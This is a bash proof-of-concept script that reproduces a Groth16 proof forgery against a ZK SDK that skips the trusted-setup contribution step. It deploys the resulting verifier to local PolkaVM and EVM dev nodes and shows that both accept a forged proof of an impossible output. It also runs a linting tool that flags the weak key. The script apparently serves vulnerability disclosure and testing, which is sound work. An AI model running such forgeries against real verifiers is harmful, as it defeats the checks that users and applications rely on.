#!/usr/bin/env bash
# Reproduce the ZKAMA / zk-polka-sdk forgery end to end, from an empty circuit
# to a forged proof accepted by a verifier running on the real PolkaVM runtime.
#
# Prerequisites on PATH (versions this was validated with in parentheses):
#   circom (2.2.2), snarkjs (0.7.5), node (22),
#   resolc (0.5.0 — newer resolc emits blobs pallet-revive rejects as
#          CodeRejected on current dev-node; see README "Toolchain pins"),
#   solc (0.8.30), cast/anvil (foundry 1.4.0),
#   revive dev-node + eth-rpc (paritytech/hardhat-polkadot, nodes-latest),
#   the `gauntlet` binary (cargo build --release in the repo root),
#   a pot12_final.ptau (any phase-1 powers-of-tau; the SDK ships pot12_final.ptau).
#
# Env:
#   PTAU        path to a phase-1 ptau file
#   PVM_RPC     eth-rpc endpoint for the PolkaVM node (default 127.0.0.1:8546)
#   EVM_RPC     EVM endpoint (default 127.0.0.1:8547)
#   PVM_PK/EVM_PK  funded dev keys for each chain
set -euo pipefail
cd "$(dirname "$0")"
WORK=$(mktemp -d)
GAUNTLET=${GAUNTLET:-gauntlet}
PVM_RPC=${PVM_RPC:-http://127.0.0.1:8546}
EVM_RPC=${EVM_RPC:-http://127.0.0.1:8547}
PVM_PK=${PVM_PK:-0x5fb92d6e98884f76de468fa3f6278f8807c48bebc13595d45af5bdc4da702133}
EVM_PK=${EVM_PK:-0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80}

echo "1) a trivial circuit whose single public output is forced to 1"
cat > "$WORK/age.circom" <<'EOF'
pragma circom 2.0.0;
template AgeCheck() { signal input birthYear; signal output isAdult; isAdult <== 1; }
component main = AgeCheck();
EOF
circom "$WORK/age.circom" --r1cs --wasm -o "$WORK" >/dev/null

echo "2) the SDK's exact pipeline: groth16 setup with NO zkey contribute"
snarkjs groth16 setup "$WORK/age.r1cs" "$PTAU" "$WORK/circuit_final.zkey" >/dev/null
snarkjs zkey export verificationkey "$WORK/circuit_final.zkey" "$WORK/vk.json" >/dev/null
snarkjs zkey export solidityverifier "$WORK/circuit_final.zkey" "$WORK/Verifier.sol" >/dev/null

echo "3) gauntlet flags the verification key before deployment:"
"$GAUNTLET" lint "$WORK/vk.json" || true

echo "4) compile and deploy the verifier to PolkaVM and EVM"
resolc --solc "$(command -v solc)" --bin "$WORK/Verifier.sol" -o "$WORK/pvm" >/dev/null 2>&1
solc --bin "$WORK/Verifier.sol" -o "$WORK/evm" --overwrite >/dev/null 2>&1
PVM_HEX=0x$(node -e "process.stdout.write(require('fs').readFileSync(process.argv[1]).toString('hex'))" "$WORK"/pvm/*.pvm)
PVM_ADDR=$(cast send --rpc-url "$PVM_RPC" --private-key "$PVM_PK" --create "$PVM_HEX" --json | node -e "process.stdin.on('data',d=>console.log(JSON.parse(d).contractAddress))")
EVM_ADDR=$(cast send --rpc-url "$EVM_RPC" --private-key "$EVM_PK" --create 0x$(cat "$WORK"/evm/*.bin) --json | node -e "process.stdin.on('data',d=>console.log(JSON.parse(d).contractAddress))")
echo "   PolkaVM verifier: $PVM_ADDR"
echo "   EVM     verifier: $EVM_ADDR"

echo "5) forge a proof asserting isAdult = 7 (impossible for an honest prover)"
"$GAUNTLET" forge "$WORK/vk.json" 7 > "$WORK/forged.json"
read a0 a1 b00 b01 b10 b11 c0 c1 p < <(node -e "
const d=require('$WORK/forged.json');
console.log(d.pA[0],d.pA[1],d.pB[0][0],d.pB[0][1],d.pB[1][0],d.pB[1][1],d.pC[0],d.pC[1],d.pubSignals[0])")
SIG='verifyProof(uint256[2],uint256[2][2],uint256[2],uint256[1])(bool)'
echo -n "   PolkaVM verifyProof(forged) = "
cast call --rpc-url "$PVM_RPC" "$PVM_ADDR" "$SIG" "[$a0,$a1]" "[[$b00,$b01],[$b10,$b11]]" "[$c0,$c1]" "[$p]"
echo -n "   EVM     verifyProof(forged) = "
cast call --rpc-url "$EVM_RPC" "$EVM_ADDR" "$SIG" "[$a0,$a1]" "[[$b00,$b01],[$b10,$b11]]" "[$c0,$c1]" "[$p]"
rm -rf "$WORK"
